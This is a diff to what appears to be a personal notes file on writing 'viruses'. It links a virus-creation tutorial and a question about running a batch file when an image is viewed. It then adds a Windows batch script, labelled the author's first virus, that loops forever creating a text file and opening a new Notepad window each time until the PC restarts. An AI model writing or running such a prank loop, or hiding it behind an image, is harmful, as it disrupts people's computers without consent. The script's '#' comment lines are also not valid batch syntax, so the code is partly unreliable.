@@ -64,3 +64,28 @@ https://techgrinch.com/create-a-virus/
 image act as bat file  to excute the code 
 
 https://stackoverflow.com/questions/8767708/execute-a-bat-file-when-an-image-is-viewed
+
+
+# my First Virus simple I created
+
+
+```
+# hide show only output
+@echo off
+
+# back here to repeat
+:top
+
+# create new file name my_message_to_you
+type NUL >"%TEMP%\My_Message_To_You.txt"
+
+# write the message in the note pad created
+echo From Python King I love you >> "%TEMP%\my_message_to_you.txt"
+
+# open the notepad created with the message
+%SystemRoot%\notepad.exe "%TEMP%\my_message_to_you.txt"
+
+# back to top and repeat forever until pc restart 
+GOTO top
+
+```
